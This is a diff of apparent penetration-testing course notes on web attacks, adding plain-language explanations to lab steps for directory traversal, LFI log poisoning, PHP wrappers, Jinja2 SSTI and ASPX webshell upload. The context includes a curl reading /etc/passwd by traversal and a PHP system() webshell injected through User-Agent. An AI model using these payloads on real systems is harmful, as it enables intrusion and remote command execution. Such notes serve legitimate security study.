@@ -247,7 +247,7 @@ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 **File Inclusion vs. Directory Traversal. The distinction that matters:**
 - **Directory Traversal** only lets you *read* a file's contents. Point it at `admin.php` and you get the raw PHP **source code**.
 - **File Inclusion** actually *includes the file into the running application*. Point it at `admin.php` and the code **executes**, same as if you'd requested that page normally.
-- Because inclusion executes the file, it also still works for plain content, so anything traversal could show you, inclusion can too. But the reverse isn't true. Confusing the two means potentially missing a code-execution opportunity where you thought you only had a read primitive.
+- Because inclusion executes the file, it also still works for plain content, so anything traversal could show you, inclusion can too. But the reverse isn't true. Confusing the two means potentially missing a code-execution opportunity where you thought you only had a read primitive (a "read primitive" just means you have the ability to read files, but not necessarily run anything).
 
 ```mermaid
 flowchart LR
@@ -277,7 +277,7 @@ Browse the app with Burp proxying, click **Admin**, find that request in **Proxy
 ```
 <?php echo system($_GET['cmd']); ?>
 ```
-*Replace the `User-Agent` header value with this exact string, then click **Send**. This gets written verbatim into `access.log`. Apache doesn't care that it looks like code, it just logs it as text.*
+*Replace the `User-Agent` header value with this exact string, then click **Send**. This gets written verbatim into `access.log`. Apache doesn't care that it looks like code, it just logs it as text. `system()` is PHP's built-in function for running an OS command and echoing its output back, exactly what you need for a one-line webshell.*
 
 > 🔍 Full breakdown of why `access.log`/`User-Agent` specifically, and why this only works with LFI (not plain traversal): [[File Inclusion & Traversal (Breakdowns)#LFI + log poisoning: why access.log and User-Agent specifically|Command Breakdowns]]
 
@@ -310,7 +310,7 @@ Change the `page` parameter to the log file's relative path, and add a `cmd` par
 
 **Step 5: Handle spaces in multi-word commands**
 A command like `ls -la` will error due to the literal space. Two fixes:
-- **IFS (Internal Field Separator)** trick, a shell-level way of separating arguments without a literal space character.
+- **IFS trick**: IFS stands for Internal Field Separator, a special shell variable that tells the shell which characters count as "gaps between arguments." By default it's a space, but you can exploit this by temporarily setting it to something else, letting you pass multi-word commands without a literal space character that might get filtered.
 - **URL-encode the space** as `%20`. Simplest option: `cmd=ls%20-la`.
 
 > 📸 Screenshot: successful `ls -la` output after URL-encoding the space.
@@ -414,7 +414,7 @@ curl "http://mountaindesserts.local:8001/meteor/index.php?page=../../../../../..
 
 ### 9.2.2. PHP Wrappers
 
-PHP wrappers are built-in protocol handlers that extend what a filename/path argument can mean to PHP, including things like "read this through a filter" or "treat this literal string as if it were a file." Two are covered here: `php://filter` and `data://`.
+PHP wrappers are built-in protocol handlers (think of them as special prefixes that change how PHP reads a path, similar to how `http://` and `ftp://` tell your browser to use different methods to fetch something). They extend what a filename/path argument can mean to PHP, including things like "read this through a filter" or "treat this literal string as if it were a file." Two are covered here: `php://filter` and `data://`.
 
 **`php://filter`: read a PHP file's *source* instead of executing it.**
 
@@ -912,7 +912,7 @@ curl -X POST --data 'username=test&password=test&ffa=1%2B1' http://<target>/logi
 ```
 *(`%2B` for a literal `+`, since form-urlencoded data treats a bare `+` as a space.) Still echoed back as literal `1+1`, not `2`. Doesn't look like it's evaluating anything on the surface.*
 
-**Step 3: Test for Jinja2 SSTI instead**
+**Step 3: Test for Jinja2 SSTI instead** (SSTI = Server-Side Template Injection, where attacker input gets evaluated by the app's templating engine, the thing responsible for turning code into HTML. Jinja2 is the templating engine used by Python-based web frameworks like Flask.)
 ```bash
 curl -X POST --data 'username=test&password=test&ffa={{7*7}}' http://<target>/login
 ```
@@ -973,7 +973,7 @@ ls /usr/share/webshells/aspx/
 *`cmdasp.aspx` is there.*
 
 **Step 3: Upload it via the browser**
-Browse to the app on port 8000, select `cmdasp.aspx` from `/usr/share/webshells/aspx/` in the file picker, click Upload. *ASP.NET WebForms needs its `__VIEWSTATE`/`__EVENTVALIDATION` tokens submitted correctly, fiddly to hand-craft with curl, so the browser form is the easier path.*
+Browse to the app on port 8000, select `cmdasp.aspx` from `/usr/share/webshells/aspx/` in the file picker, click Upload. *ASP.NET WebForms needs its `__VIEWSTATE`/`__EVENTVALIDATION` tokens submitted correctly. These are hidden fields ASP.NET bakes into every form to track page state and prevent certain tampering, they're long encoded strings that the browser sends back automatically when you submit the form. Hand-crafting them with curl is fiddly, so the browser form is the easier path.*
 
 **Step 4: Confirm it landed on port 80**
 ```bash
